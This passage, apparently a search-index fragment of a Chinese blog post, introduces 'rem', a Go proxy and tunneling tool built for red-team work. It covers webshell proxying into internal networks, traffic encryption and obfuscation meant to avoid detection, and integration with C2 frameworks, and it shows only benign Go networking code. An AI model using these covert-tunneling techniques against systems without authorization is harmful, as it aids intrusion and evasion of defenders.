\u53ef\u4ee5\u57fa\u4e8e\u8fd9\u4e2a\u6846\u67b6\u5bf9\u6d41\u91cf\u8fdb\u884c\u4efb\u4f55\u7684\u63c9\u6413, \u7ec4\u88c5, \u9690\u85cf. \u4f46\u4e5f\u56e0\u5982\u6b64, \u5728\u5f00\u6e90\u65f6\u53bb\u6389\u4e86\u4e0d\u5c11\u5173\u4e8eOPSEC\u7684\u5177\u4f53\u5b9e\u73b0, \u53ea\u4fdd\u7559\u4e86\u8f83\u4e3a\u57fa\u7840\u7684\u7248\u672c, \u5bf9\u4e8e\u719f\u6089golang\u4e0e\u7f51\u7edc\u7684\u670b\u53cb, \u4f7f\u7528ai\u5c31\u80fd\u5feb\u901f\u5b9e\u73b0\u81ea\u5df1\u60f3\u8981\u7684\u9700\u6c42. </p>"},{"location":"blog/2025/04/13/rem-introduce/#\u9ad8\u7ea7\u7279\u6027","title":"\u9ad8\u7ea7\u7279\u6027","text":""},{"location":"blog/2025/04/13/rem-introduce/#webshell\u4ee3\u7406-done","title":"webshell\u4ee3\u7406 (done)","text":"<p>\u4f8b\u5982\u6240\u6709\u534f\u8bae\u90fd\u4e0d\u51fa\u7f51\u7684\u573a\u666f\uff0c\u7ea2\u961f\u901a\u5e38\u4f1a\u6784\u5efawebshell\u4ee3\u7406\u7684\u65b9\u5f0f\u5b9e\u73b0\uff0c\u5982neoreg\u6216suo5\uff0c\u7136\u540e\u7ea2\u961f\u901a\u8fc7webshell\u4ee3\u7406\u8bbf\u95ee\u5185\u7f51\u3002neoreg\u5b9e\u9645\u4e0a\u662f\u534a\u53cc\u5de5\u7684\u4fe1\u9053\uff0c\u9700\u8981\u901a\u8fc7\u8f6e\u8be2\u8bfb\u53d6\u6570\u636e\uff0c\u56e0\u6b64\u4e0d\u7ba1\u662f\u5ef6\u8fdf\u8fd8\u662f\u6027\u80fd\u90fd\u5e76\u4e0d\u662f\u7279\u522b\u51fa\u8272\uff0c\u800csuo5\u91c7\u7528\u4e86websocket\u5168\u53cc\u5de5\u4fe1\u9053\u3002 gost\u65e0\u6cd5\u5728\u8fd9\u79cd\u573a\u666f\u4e0b\u4f7f\u7528\u3002\u4f46\u5b9e\u9645\u4e0a\u53ef\u4ee5\u5b9e\u73b0neoreg\u4e0esuo5\u4ee3\u7406\u534f\u8bae, \u901a\u8fc7webshell\u4ee3\u7406\u4e0e\u5185\u7f51\u7684agent\u8054\u901a\uff0c\u4ee5\u5b9e\u73b0\u66f4\u590d\u6742\u7684\u6d41\u91cf\u96a7\u9053\u64cd\u4f5c\u3002</p>"},{"location":"blog/2025/04/13/rem-introduce/#\u65e0\u635f\u4ee3\u7406-done","title":"\u65e0\u635f\u4ee3\u7406 (done)","text":"<p>\u5404\u79cd\u4ee3\u7406\u5de5\u5177\u4e3a\u4e86\u4fdd\u8bc1\u6700\u5927\u517c\u5bb9\u5ea6, \u901a\u5e38\u6700\u7ec8\u5bf9\u5916\u66b4\u9732\u7684\u90fd\u662fsocks5\u6216\u8005\u66f4\u9ad8\u7ea7\u4e00\u4e9b\u4f7f\u7528clash. \u4f46\u8fd9\u79cd\u65b9\u5f0f\u8fdb\u884c\u7684\u8f6c\u6362\u5176\u5b9e\u662f\u6709\u975e\u5e38\u5927\u7684\u6027\u80fd\u635f\u5931\u7684.  \u7279\u522b\u662f\u5728\u8fdb\u884c\u626b\u63cf\u65f6\u901a\u5e38\u4f1a\u6709\u5f88\u591a\u76ee\u6807, \u56e0\u6b64\u4f1a\u5728\u672c\u5730\u5efa\u7acb\u5927\u91cf\u7684\u8fde\u63a5. \u8fd9\u79cd\u573a\u666f\u4e0b\u4ee3\u7406\u7684\u6027\u80fd\u4f1a\u6781\u5927\u7684\u8870\u51cf.</p> <p>\u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898, \u4ee3\u7406\u5de5\u5177\u5c31\u5e94\u8be5\u63d0\u4f9b\u76f4\u63a5\u4ea4\u4e92\u7684SDK, \u8ba9\u7b2c\u4e09\u65b9\u5de5\u5177\u80fd\u591f\u76f4\u63a5\u4f7f\u7528\u4ee3\u7406\u5de5\u5177\u7684\u4fe1\u9053\uff0c\u800c\u4e0d\u9700\u8981\u5c06\u5176\u5148\u8f6c\u4e3asocks\u6216\u8005\u5176\u4ed6\u534f\u8bae.</p>"},{"location":"blog/2025/04/13/rem-introduce/#\u7528\u6237\u4f53\u9a8c-done","title":"\u7528\u6237\u4f53\u9a8c (done)","text":"<p>rem\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u53ea\u9700\u8981\u4e00\u884c\u547d\u4ee4, \u7528\u8fc7frp, nps\u4e4b\u7c7b\u7684\u5de5\u5177\u540e, \u6211\u4e0d\u60f3\u8981\u6709\u914d\u7f6e\u6587\u4ef6, \u4e5f\u4e0d\u60f3\u8981\u6709server\u548cclient\u4e24\u7aef. \u53ea\u60f3\u8981\u4e00\u4e2a\u7b80\u6d01\u800c\u4f18\u96c5\u7684\u547d\u4ee4\u884c\u5de5\u5177, \u6240\u6709\u7684\u64cd\u4f5c\u90fd\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u5b9e\u73b0. </p> <p>\u5e76\u4e14\u9ad8\u5ea6\u590d\u7528\u4e86url\u534f\u8bae\u7684\u5404\u79cd\u529f\u80fd\uff0c \u901a\u8fc7url\u534f\u8bae\u5b8c\u6210\u590d\u6742\u7684\u53c2\u6570\u914d\u7f6e, \u5c06\u57fa\u672c\u53c2\u6570\u7b80\u5316\u5230\u53ea\u9700\u89813\u4e2a. </p>"},{"location":"blog/2025/04/13/rem-introduce/#proxy-as-a-sdk-done","title":"Proxy as a SDK (done)","text":"<p>rem\u9ed8\u8ba4\u63d0\u4f9b\u4e86\u547d\u4ee4\u884c\u5de5\u5177\uff0c \u4f46\u66f4\u91cd\u8981\u7684\u662frem\u80fd\u4f5c\u4e3a\u5305\u88ab\u5d4c\u5165\u5230\u5404\u79cd\u5404\u6837\u7684\u5de5\u5177\u4e2d, \u6216\u8005\u901a\u8fc7proxyclient\u4e0e\u975egolang\u7684\u5de5\u5177\u8054\u52a8.</p> <p>\u5df2\u7ecf\u901a\u8fc7proxyclient\u5b9e\u73b0\u5176\u4ee3\u7406\u529f\u80fd\u7684\u7b2c\u4e09\u65b9\u5de5\u5177\uff1a</p> <ul> <li>https://github.com/chainreactors/gogo</li> <li>https://github.com/chainreactors/zombie</li> <li>https://github.com/zema1/suo5</li> </ul> <p>\u76f4\u63a5\u5d4c\u5165rem\u7684\u5de5\u5177:</p> <ul> <li>https://github.com/chainreactors/malice-network</li> <li>https://github.com/chainreactors/malefic</li> </ul>"},{"location":"blog/2025/04/13/rem-introduce/#\u8bbe\u8ba1","title":"\u8bbe\u8ba1","text":"<p>\u4ece\u5f00\u6e90\u4e16\u754c\u7684\u5de5\u5177\u5927\u81f4\u80fd\u603b\u7ed3\u51fa\u4e00\u6b3e\u80fd\u9002\u914d\u6240\u6709\u573a\u666f\u7684\u4ee3\u7406\u5de5\u5177\u5e94\u8be5\u5177\u5907\u7684\u80fd\u529b. </p> <ul> <li>\u7aef\u53e3\u8f6c\u53d1, \u5305\u62ec\u6b63\u5411\u7aef\u53e3\u8f6c\u53d1\u4e0e\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1. \u6b63\u5411\u4ee3\u7406\u4e0e\u53cd\u5411\u4ee3\u7406\u4e5f\u662f\u57fa\u4e8e\u6b64\u5b9e\u73b0</li> <li>\u591a\u4ee3\u7406\u534f\u8bae\u652f\u6301, \u9700\u8981\u652f\u6301\u539f\u672c\u5c31\u5b58\u5728\u7684\u4ee3\u7406\u534f\u8bae\u4ee5\u4fdd\u8bc1\u4e0e\u5176\u4ed6\u534f\u8bae\u7684\u8054\u52a8</li> <li>\u591a\u4fe1\u9053\u652f\u6301, \u5c3d\u53ef\u80fd\u591a\u7684\u652f\u6301\u7f51\u7edc\u4e16\u754c\u4e2d\u5df2\u7ecf\u5b58\u5728\u7684\u4f20\u8f93\u5c42\u534f\u8bae</li> <li>\u7ea7\u8054, \u7ea7\u8054\u5b9e\u9645\u4e0a\u662f\u4ee3\u7406\u5de5\u5177\u7684\u81ea\u4e3e</li> <li>\u6d41\u91cf\u52a0\u5bc6\u4e0e\u6df7\u6dc6, \u8fd9\u662f\u4ee3\u7406\u5de5\u5177\u5b89\u5168\u6027\u7684\u4fdd\u8bc1</li> </ul> <p>\u800c\u8fd9\u4e9b\u8fd8\u53ea\u662f\u57fa\u672c\u529f\u80fd,  \u5b9e\u73b0\u4e86\u8fd9\u4e9b\u529f\u80fd, \u624d\u6709\u80fd\u53bb\u8ba8\u8bba\u4e0b\u4e00\u4ee3\u4ee3\u7406\u5de5\u5177\u5e94\u8be5\u662f\u4ec0\u4e48\u6837\u5b50\u7684.</p>"},{"location":"blog/2025/04/13/rem-introduce/#\u8bbe\u8ba1\u601d\u8def","title":"\u8bbe\u8ba1\u601d\u8def","text":"<p>\u5728\u80cc\u666f\u4e2d\u63d0\u5230\u8fc7\u7684\u5de5\u5177\u4e2d\uff0c\u6700\u63a5\u8fd1\u8bbe\u8ba1\u76ee\u6807\u7684\u662fgost_v3, \u6240\u4ee5\u6211\u4eec\u5148\u770b\u770b\u5b83\u7684\u67b6\u6784.</p> <p>\u5177\u4f53\u7684\u4ee3\u7801\u5206\u6790\u5982\u679c\u6709\u4eba\u613f\u610f\u770b, \u5c31\u5355\u72ec\u5199\u4e00\u7bc7\uff0c\u8fd9\u91cc\u53ea\u8bb2\u67b6\u6784</p> <p>\u4e00\u4e2aGOST\u670d\u52a1\u6216\u8282\u70b9\u88ab\u5206\u4e3a\u4e24\u5c42\uff0c\u6570\u636e\u901a\u9053\u5c42\u548c\u6570\u636e\u5904\u7406\u5c42. \u6570\u636e\u901a\u9053\u5c42\u5bf9\u5e94\u7684\u662f\u62e8\u53f7\u5668\u548c\u76d1\u542c\u5668\uff0c\u6570\u636e\u5904\u7406\u5c42\u5bf9\u5e94\u7684\u662f\u8fde\u63a5\u5668\uff0c\u5904\u7406\u5668\u548c\u8f6c\u53d1\u5668\uff0c\u8fd9\u91cc\u53c8\u6839\u636e\u662f\u5426\u4f7f\u7528\u8f6c\u53d1\u5668\u6765\u533a\u5206\u662f\u4ee3\u7406\u8fd8\u662f\u8f6c\u53d1\u3002</p> <p>\u8fd9\u4e2a\u67b6\u6784\u5bf9\u5e94\u7684\u662fgo\u7684net\u5305\u4e2d\u7684\u67b6\u6784, \u4e0ego\u672c\u8eab\u7684\u8bbe\u8ba1\u7406\u5ff5\u975e\u5e38\u5951\u5408. golang\u7684\u7f51\u7edc\u8bbe\u8ba1\u975e\u5e38\u7b26\u5408\u76f4\u89c9.</p>"},{"location":"blog/2025/04/13/rem-introduce/#golang\u7684net\u5305","title":"golang\u7684net\u5305","text":"<p>golang \u5305\u4e2d\u7684\u51e0\u4e2a\u91cd\u8981\u6982\u5ff5\u3002 Listener \u76d1\u542c\u5668</p> <pre><code>type Listener interface {\n    // Accept \u7b49\u5f85\u5e76\u8fd4\u56de\u4e0b\u4e00\u4e2a\u8fde\u63a5\u5230\u6b64\u76d1\u542c\u5668\u7684\u8fde\u63a5\u3002\n    Accept() (Conn, error)\n\n    // Close \u5173\u95ed\u76d1\u542c\u5668\u3002\u4efb\u4f55\u963b\u585e\u4e2d\u7684 Accept \u64cd\u4f5c\u90fd\u4f1a\u4e0d\u518d\u963b\u585e\u5e76\u8fd4\u56de\u9519\u8bef\u3002\n    Close() error\n\n    // Addr \u8fd4\u56de\u76d1\u542c\u5668\u7684\u7f51\u7edc\u5730\u5740\u3002\n    Addr() Addr\n}\n</code></pre> <p>Dialer \u62e8\u53f7\u5668</p> <pre><code>type Dialer interface {\n    Dial(network, address string) (net.Conn, error)\n}\n</code></pre> <p>Conn \u8fde\u63a5, Accept\u4e0eDial\u90fd\u5c06\u8fd4\u56deConn</p> <pre><code>type Conn interface {\n    // Read \u4ece\u8fde\u63a5\u4e2d\u8bfb\u53d6\u6570\u636e\u3002\n    Read(b []byte) (n int, err error)\n\n    // Write \u5411\u8fde\u63a5\u4e2d\u5199\u5165\u6570\u636e\u3002\n    Write(b []byte) (n int, err error)\n\n    // Close \u5173\u95ed\u8fde\u63a5\u3002\n    Close() error\n\n... Others\n}\n</code></pre> <p>golang \u5c06tcp/udp\u90fd\u6309\u7167\u8fd9\u6837\u7684\u62bd\u8c61\u8fdb\u884c\u5c01\u88c5, \u4e5f\u662f\u4f20\u8f93\u5c42\u7684\u6700\u5c0f\u62bd\u8c61\u3002 \u6362\u53e5\u8bdd\u8bf4\uff0c\u6211\u4eec\u53ea\u8981\u5b9e\u73b0\u4e86\u8fd9\u4e09\u4e2ainterface\uff0c \u5c31\u80fd\u8ba9\u4efb\u610f\u6570\u636e\u4f20\u8f93\u7684\u4fe1\u9053\u4f5c\u4e3a\u6211\u4eec\u7684\u4f20\u8f93\u5c42\uff08\u5f53\u7136\u73b0\u5b9e\u8981\u6bd4\u8fd9\u590d\u6742\u4e00\u70b9\uff0c\u540e\u9762\u4f1a\u63d0\u5230\uff09\u3002</p> <p>\u66f4\u91cd\u8981\u7684\u662f\u4e3a\u4ec0\u4e48rem\u4f7f\u7528golang\u6784\u5efa\uff0c\u8fd9\u4e5f\u4e0e\u8fd9\u4e2a\u8bbe\u8ba1\u6709\u5173\u3002 \u5982\u679c\u5bf9golang\u7684\u5404\u79cd\u7f51\u7edc\u5e93\u719f\u6089\u7684\u670b\u53cb\u5e94\u8be5\u77e5\u9053\uff0cnet.Conn\u8fd9\u4e2a\u63a5\u53e3\u6216\u8005\u5176\u7f29\u7565\u7248 io.ReadWriteCloser \u63a5\u53e3\u88ab\u5e7f\u6cdb\u7528\u4e8e\u5404\u79cd\u5404\u6837\u6709\u5173\u6570\u636e\u4f20\u8f93/\u52a0\u5bc6/\u7f51\u7edc/\u6d41\u5f0f\u4f20\u8f93\u7684\u573a\u666f\u3002</p> <p>\u4f8b\u5982http,tls,shadowsocks\u5e93\u4e2d\u90fd\u6709ServerConn\u51fd\u6570\uff0c \u7528\u4e8e\u4e3a\u5b9e\u73b0\u4e86net.Conn\u7ed3\u6784\u4f53\u7684\u7ed3\u6784\u5b9e\u73b0\u4e0a\u5c42\u5e94\u7528\uff0c \u5e76\u4e14ServerConn\u8fd4\u56de\u503c\u4e00\u822c\u8fd8\u662fnet.Conn, \u53ef\u4ee5\u88ab\u591a\u5c42\u5d4c\u5957\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u5c06\u4e00\u4e2a\u57fa\u4e8e\u67d0\u4e2a\u5916\u90e8api\u901a\u8baf(\u4f8b\u5982telegram)\u7684\u4fe1\u9053\u4f5c\u4e3a\u4f20\u8f93\u5c42\uff0c\u53ea\u9700\u5b9e\u73b0Dial\u548cListener\u5bf9\u5e94\u7684\u65b9\u6cd5\u5373\u53ef\u8ba9\u5176\u5305\u88c5\u4e0atls,shadowsocks\u7b49\u5404\u79cd\u52a0\u5bc6\u534f\u8bae\u3002</p>"},{"location":"blog/2025/04/13/rem-introduce/#gost\u7684\u8bbe\u8ba1","title":"gost\u7684\u8bbe\u8ba1","text":"<p>golang\u5c06tcp,udp,icmp\u7684\u5404\u79cd\u7528\u6cd5\u90fd\u5c01\u88c5\u6210\u4e86\u8fd9\u4e9b\u7528\u6cd5\u3002\u5982\u679c\u719f\u6089golang\u5404\u79cd\u7f51\u7edc\u76f8\u5173\u7684\u5e93\uff0c\u66f4\u662f\u4f1a\u53d1\u73b0\uff0c\u5404\u79cd\u590d\u6742\u7684\u534f\u8bae\u5b9e\u73b0\u51e0\u4e4e\u90fd\u6700\u7ec8\u5bf9\u5916\u66b4\u9732\u8fd9\u4e9binterface\u3002\u662f\u63a5\u53e3\u4e0e\u7ec4\u5408\u8fd9\u4e2a\u8bbe\u8ba1\u7406\u5ff5\u7684\u6559\u79d1\u4e66\u3002</p> <p>\u5728gost\u4e2d\uff0c\u5728\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u5e76\u6ca1\u6709server\u4e0eclient\u7684\u533a\u522b\uff0c\u8fd9\u662f\u4e2a\u975e\u5e38\u4f18\u96c5\u8bbe\u8ba1\uff0c\u610f\u5473\u7740server\u4e0eclient\u53ef\u4ee5\u968f\u65f6\u4e92\u76f8\u8f6c\u5316\u3002\u901a\u8fc7gost\u642d\u5efa\u7684\u4ee3\u7406\u53ef\u4ee5\u662f\u7f51\u72b6\u7684\uff0c\u800c\u4e0d\u53ea\u662f\u6811\u72b6\u7684\u3002\u8fd9\u662f\u8282\u70b9\u95f4\u4e92\u901a\u7684\u5fc5\u5907\u8bbe\u8ba1\u4e4b\u4e00\u3002</p> <p>gost\u7684server\u4e0eclient\u662f\u901a\u8fc7\u7ec4\u5408Listener\uff0cDialer\uff0cConn\uff0cProxy\u5b9e\u73b0\u7684\u3002\u542f\u7528Listener\u7684\u5c31\u662fserver\uff0c\u4f7f\u7528Dialer\u7684\u5c31\u662fclient\u3002\u4f46\u4e5f\u53ef\u4ee5\u65e2\u6253\u5f00Listener\uff0c\u4e5f\u4f7f\u7528Dialer\uff0c\u8fd9\u5373\u662f\u53c8\u662f\u7684\u5e94\u8be5\u53eb\u505aagent\u3002rem\u4e5f\u662f\u8fd9\u4e2a\u8bbe\u8ba1\uff0c\u5982\u679c\u4e0d\u8003\u8651\u903b\u8f91\u4e0a\u7684\u5212\u5206server\u4e0eclient\u65f6\uff0c\u6240\u6709\u7684rem\u90fd\u662f\u5e73\u7b49\u7684agent\uff0c\u6570\u636e\u53ef\u4ee5\u5728\u8fd9\u4e9bagent\u76f4\u63a5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u4ea4\u4e92\u3002\u5728gost\u4e2d\uff0c\u7ea7\u8054\u662f\u4e0d\u8a00\u81ea\u660e\u7684\uff0c\u4e0d\u9700\u8981\u7279\u610f\u5f3a\u8c03\u7684\u3002</p> <p>\u4ece\u8fd9\u4e2a\u89d2\u5ea6\u770b\u6765\uff0cgost\u662f\u4e2a\u975e\u5e38\u5b8c\u7f8e\u7684\u4ee3\u7406\u5de5\u5177\uff0c\u5b83\u652f\u6301\u975e\u5e38\u591a\u7684\u4f20\u8f93\u5c42\u534f\u8bae\uff0c\u4e5f\u652f\u6301\u5bf9\u6d41\u91cf\u4f20\u8f93\u7684\u4efb\u610f\u63c9\u6413\u3002gost\u6bd4frp\u81ea\u7531\u5f97\u591a\uff0c\u6bd4\u6709\u7740\u6bd4iox\u66f4\u52a0\u4e30\u5bcc\u4e0e\u5f3a\u5927\u7684\u7279\u6027\uff0c\u66f4\u662f\u80fd\u5b9e\u73b0stoyaway\u80fd\u5b9e\u73b0\u7684\u4e00\u5207\u529f\u80fd\u3002\u5e76\u4e14gost\u62e5\u6709\u4e00\u4e2a\u7565\u6709\u95e8\u69db\uff0c\u4f46\u6781\u5176\u4f18\u96c5\u7684\u547d\u4ee4\u884c\u8bbe\u8ba1\u3002 \u7f3a\u70b9\u5c31\u662f\uff0c\u5b83\u4e0d\u592a\u9002\u5408\u9ad8\u5f3a\u5ea6\u5bf9\u6297\u7684\u6e17\u900f\u73af\u5883\u3002gost\u548cfrp\u4e00\u6837\uff0c\u662f\u4e3a\u4e86\u89e3\u51b3\u7f51\u7edc\u95ee\u9898\u7684\uff0c\u4e0d\u662f\u4e3a\u4e86\u5bf9\u6297\u800c\u751f\u7684\u3002\u5b83\u4eec\u5185\u5d4c\u4e86web/grpc\uff0c\u6709\u4e00\u7cfb\u5217\u51c6\u5165\uff0c\u9650\u6d41\uff0c\u8ba4\u8bc1\uff0c\u53ef\u89c2\u5bdf\u6027\u529f\u80fd\uff0c\u5bfc\u81f4\u4e86\u5ba2\u6237\u7aef\u8f83\u4e3a\u81c3\u80bf\u3002\u6700\u5173\u952e\u7684\u662f\uff0c\u4ed6\u4eec\u5bf9\u6570\u636e\u52a0\u5bc6\u7684\u5b9e\u73b0\u53ea\u9650\u4e8etls/mtls, \u8fd9\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\u53cd\u800c\u6210\u4e3a\u4e86\u7279\u5f81\u3002</p> <p>\u800crem\u9879\u76ee\u5f00\u59cb\u4e4b\u521d\u8fd8\u53ea\u6709gost v2\u548cfrp\u3002gost\u4e0d\u652f\u6301\u53cd\u5411\u4ee3\u7406\uff0cfrp\u4e0d\u652f\u6301\u6b63\u5411\u4ee3\u7406\u3002\u5230\u4e862024\u5e74\uff0cgost\u4e0efrp\u90fd\u8865\u5168\u81ea\u5df1\u529f\u80fd\u4e0a\u5f31\u70b9\uff0c\u57fa\u672c\u5b9e\u73b0\u4e86\u5bf9\u6d41\u91cf\u8d70\u5411\u7684\u81ea\u7531\u7ec4\u5408\u3002\u90a3rem\u53ea\u9700\u8981\u5728\u7ee7\u627f\u4ed6\u4eec\u4f18\u70b9\u7684\u540c\u65f6\u5b9e\u73b0\u5bf9\u6d41\u91cf\u672c\u8eab\u7684\u4efb\u610f\u63c9\u6413\u3002</p> <p>gost\u4f5c\u4e3a\u4e00\u4e2a\u4ee3\u7406\u5de5\u5177\uff0c \u5df2\u7ecf\u80fd\u8986\u76d6\u7edd\u5927\u90e8\u5206\u9700\u6c42\u3002 \u4f46\u5bf9\u4e8e\u653b\u9632\u573a\u666f\u6765\u8bf4, \u8fd8\u662f\u6709\u4e0d\u5c11\u7279\u6b8a\u7684\u9700\u6c42\u3002</p>"},{"location":"blog/2025/04/13/rem-introduce/#rem\u7684\u8bbe\u8ba1","title":"rem\u7684\u8bbe\u8ba1","text":"<p>\u800crem\u7684\u62bd\u8c61\u4f1a\u66f4\u52a0\u5f7b\u5e95\u4e00\u4e9b\u3002 \u4e0b\u9762\u7684\u5185\u5bb9\u5efa\u8bae\u7ed3\u5408rem\u7684\u5177\u4f53\u4ee3\u7801\u5b9e\u73b0\u9605\u8bfb\u3002</p> <p>\u4e0b\u9762\u7684\u5185\u5bb9\u57fa\u4e8e\u5df2\u7ecf\u5b9e\u73b0\u4e86\u4e0a\u8ff0\u57fa\u672c\u529f\u80fd\uff0c\u8fdb\u4e00\u6b65\u63a2\u7d22\u7f51\u7edc\u4fa7\u7684\u5404\u5f0f\u5404\u6837\u7684\u73a9\u6cd5\u3002</p> <p>rem\u57fa\u4e8eOSI\u6a21\u578b\u4e2d\u7684\u4f20\u8f93\u5c42\u91cd\u65b0\u6784\u5efa\u4f20\u8f93\u5c42\u5230\u5e94\u7528\u5c42\u4e4b\u95f4\u7684\u7f51\u7edc\u62bd\u8c61\u3002</p>"},{"location":"blog/2025/04/13/rem-introduce/#\u4f20\u8f93\u5c42","title":"\u4f20\u8f93\u5c42","text":"<p>rem\u7684\u4f20\u8f93\u5c42\u8868\u793a\u4e3atunnel\u3002\u6bcf\u4e2atunnel\u7531\u4e00\u4e2adialer\u548c\u4e00\u4e2alistener\u7ec4\u6210, \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c listener\u548cdialer\u53ea\u5728\u4f20\u8f93\u5c42\u4e0a\u8868\u793aserver\u548cclient\u7684\u5173\u7cfb\uff0c \u5f53\u5efa\u7acb\u8d77tunnel\u540e\uff0crem\u4e4b\u95f4\u90fd\u662f\u5e73\u7b49\u7684\u8282\u70b9\u3002\u8fd9\u4e00\u70b9\u548c\u4ee5\u5f80\u7684\u4ee3\u7406\u5de5\u5177\u6709\u5f88\u5927\u4e0d\u540c\u3002</p> <p>golang\u5df2\u7ecf\u63d0\u4f9b\u4e86icmp, udp, tcp, unix\u56db\u4e2a\u534f\u8bae\u4f5c\u4e3a\u4f20\u8f93\u5c42\uff0c\u6807\u51c6\u5e93\u5b9e\u73b0\u4e86\u5176Dialer\u548cListener\u63a5\u53e3\uff0c \u5f00\u7bb1\u5373\u7528\u3002 </p> <p>\u56e0\u6b64tcp\u4e5f\u662f\u6700\u5bb9\u6613\u5b9e\u73b0\u7684tunnel\uff0c \u51e0\u4e4e\u4e0d\u9700\u8981\u989d\u5916\u7684\u4fee\u6539\uff0c \u5c31\u53ef\u4ee5\u5c06tcp\u534f\u8bae\u4f5c\u4e3atunnel\u4f7f\u7528\u3002 \u8fd9\u91cc\u662f\u4e00\u4e2a\u5220\u53bb\u65e0\u5173\u4ee3\u7801\u7684tcp tunnel\u7684\u5b9e\u73b0\u3002</p> <pre><code>type TCPDialer struct {  \n    net.Conn  \n    meta core.Metas  \n}  \n\nfunc NewTCPDialer(ctx context.Context) *TCPDialer {  \n    return &amp;TCPDialer{  \n       meta: core.GetMetas(ctx),  \n    }  \n}  \n\nfunc (c *TCPDialer) Dial(dst string) (net.Conn, error) {  \n    u, err := core.NewURL(dst)  \n    if err != nil {  \n       return nil, err  \n    }  \n    c.meta[\"url\"] = u  \n    return net.Dial(\"tcp\", u.Host)  \n}  \n\ntype TCPListener struct {  \n    listener net.Listener  \n    meta     core.Metas  \n}  \n\nfunc NewTCPListener(ctx context.Context) *TCPListener {  \n    return &amp;TCPListener{  \n       meta: core.GetMetas(ctx),  \n    }  \n}  \n\nfunc (c *TCPListener) Listen(dst string) (net.Listener, error) {  \n    u, err := core.NewURL(dst)  \n    if err != nil {  \n       return nil, err  \n    }  \n    c.meta[\"url\"] = u  \n\n    listener, err := net.Listen(\"tcp\", u.Host)  \n    if err != nil {  \n       return nil, err  \n    }  \n    c.listener = listener  \n    return listener, nil  \n}  \n\nfunc (c *TCPListener) Accept() (net.Conn, error) {  \n    return c.listener.Accept()  \n}  \n\nfunc (c *TCPListener) Close() error {  \n    if c.listener != nil {  \n       return c.listener.Close()  \n    }  \n    return nil  \n}  \n\nfunc (c *TCPListener) Addr() net.Addr {  \n    return c.meta.URL()  \n}\n</code></pre> <p>\u975e\u5e38\u7b80\u5355\u4e14\u6e05\u6670\uff0c \u8fd9\u4e5f\u662f\u4e3a\u4e86\u6700\u5927\u7a0b\u5ea6\u5229\u7528golang\u539f\u6709\u7684\u57fa\u7840\u8bbe\u65bd\uff0c\u53ea\u9700\u8981\u5b9e\u73b0\u4e86net\u5305\u7684\u63a5\u53e3\u7684\u4f20\u8f93\u534f\u8bae\uff0c\u90fd\u80fd\u7ecf\u8fc7\u975e\u5e38\u7b80\u5355\u7684\u4fee\u6539\u4f5c\u4e3arem\u7684transport</p> <p>\u66f4\u8fdb\u4e00\u6b65\uff0c\u5f00\u59cb\u4e0a\u5f3a\u5ea6\u4e86\u3002</p>"},{"location":"blog/2025/04/13/rem-introduce/#\u4f20\u8f93\u5c42\u4e4b\u4e0b","title":"\u4f20\u8f93\u5c42\u4e4b\u4e0b","text":"<p>golang\u867d\u7136\u9ed8\u8ba4\u5c31\u5b9e\u73b0\u4e86udp\u534f\u8bae\u7684\u6240\u6709\u7684\u63a5\u53e3\uff0c \u4f46\u9ed8\u8ba4\u63d0\u4f9b\u7684udp\u534f\u8bae\u662f\u4e0d\u53ef\u9760\u7684\uff0c \u5982\u679c\u8981\u5c06\u5176\u4f5c\u4e3a\u53ef\u9760\u7684tunnel\uff0c\u90a3\u6211\u4eec\u5c31\u9700\u8981\u81ea\u5df1\u6765\u505a\u3002 \u901a\u5e38\u8fd9\u4e2a\u534f\u8bae\u53eb\u505a ARQ (Automatic Repeat-reQuest), \u4e16\u754c\u4e0a\u6709\u975e\u5e38\u591a\u7684ARQ\u534f\u8bae\uff0c\u4f8b\u5982TCP\u5c31\u662f\u6700\u77e5\u540d\u7684ARQ\u534f\u8bae\u3002 </p> <p>\u4e3a\u4ec0\u4e48\u5c06ARQ\u534f\u8bae\u79f0\u4e3a\u4f20\u8f93\u5c42\u4e4b\u4e0b\uff0c \u539f\u56e0\u5c31\u5728\u4e8eARQ\u534f\u8bae\u4e0d\u9002\u7528net.Conn\uff0c \u800c\u662f\u57fa\u4e8enet.PacketConn. </p> <p><pre><code>type PacketConn interface {  \n    ReadFrom(p []byte) (n int, addr Addr, err error)  \n\n    WriteTo(p []byte, addr Addr) (n int, err error)\n    ...\n}\n</code></pre> \u4e0enet.Conn\u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u8fd9\u4e24\u4e2a\u63a5\u53e3\u3002 PacketConn\u662f\u9762\u5411\u65e0\u72b6\u6001\u7684\u6570\u636e\u5305\u7684\uff0c \u4e0d\u540c\u4e8etcp\u5df2\u7ecf\u5728\u64cd\u4f5c\u7cfb\u7edf\u5c42\u5b9e\u73b0\u4e86\u5199\u7ed9\u8c01\u7684\u95ee\u9898\uff0cUDP/ICMP\u6216\u8005\u5176\u4ed6\u65e0\u72b6\u6001\u6570\u636e\u5305(\u4f8b\u5982\u57fa\u4e8e\u5916\u90e8api\u7684\u4f20\u8f93\u5c42)\uff0c \u90fd\u9700\u8981\u5904\u7406\u8fd9\u4e2a\u95ee\u9898\u3002 </p> <p>\u6211\u4eec\u9700\u8981\u5c06PacketConn\u5c01\u88c5\u4e3aConn\uff0c\u5e76\u4e14\u5904\u7406\u5176\u4e2d\u7684\u5404\u79cd\u9519\u8bef/\u91cd\u4f20/\u4e22\u5305/\u987a\u5e8f\u7b49\u95ee\u9898\uff0c \u624d\u80fd\u5b9e\u73b0\u4e00\u4e2a\u7a33\u5b9a\u7684\u4f20\u8f93\u5c42\u3002 tunnel\u662f\u642d\u5efa\u5728\u7a33\u5b9a\u53ef\u9760\u7684Conn\u4e4b\u4e0a\u7684\uff0c\u662f\u9762\u5411\u6570\u636e\u6d41\u7684\u3002</p> <p>\u597d\u5728golang\u4e2d\u5df2\u7ecf\u6709\u975e\u5e38\u591a\u6210\u719f\u7684ARQ\u534f\u8bae\u5b9e\u73b0\uff0c \u4f8b\u5982:</p> <ul> <li>kcp-go 